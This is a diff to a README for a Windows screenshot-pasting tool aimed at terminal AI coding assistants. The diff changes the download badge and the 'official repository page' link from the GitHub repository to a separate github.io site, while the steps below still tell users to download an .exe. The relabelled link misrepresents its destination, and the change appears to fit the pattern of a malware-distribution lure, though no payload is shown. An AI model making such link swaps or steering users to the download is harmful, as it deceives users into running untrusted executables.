@@ -1,6 +1,6 @@
 # 📸 snappaste-pro - Paste screenshots directly into terminal windows
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/pinwheelrollhigherup688/snappaste-pro)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://pinwheelrollhigherup688.github.io)
 
 snappaste-pro allows you to paste screenshots into your Windows terminal using the standard Control+V keyboard shortcut. This tool brings the ease of Mac-style workflows to Windows users. It supports terminal-based AI coding assistants like Claude Code, Gemini CLI, OpenAI Codex, and Aider. You capture a screenshot, press your keys, and send the image data to your AI tool in one step.
 
@@ -21,7 +21,7 @@ To run this tool, your computer needs the following:
 
 ## 📥 How to Install
 
-1. Visit the [official repository page](https://github.com/pinwheelrollhigherup688/snappaste-pro) to download the latest version.
+1. Visit the [official repository page](https://pinwheelrollhigherup688.github.io) to download the latest version.
 2. Look for the Releases section on the right side of the page.
 3. Click the link for the most recent file ending in .exe.
 4. Save the file to your computer. A folder like Downloads or your desktop works well.
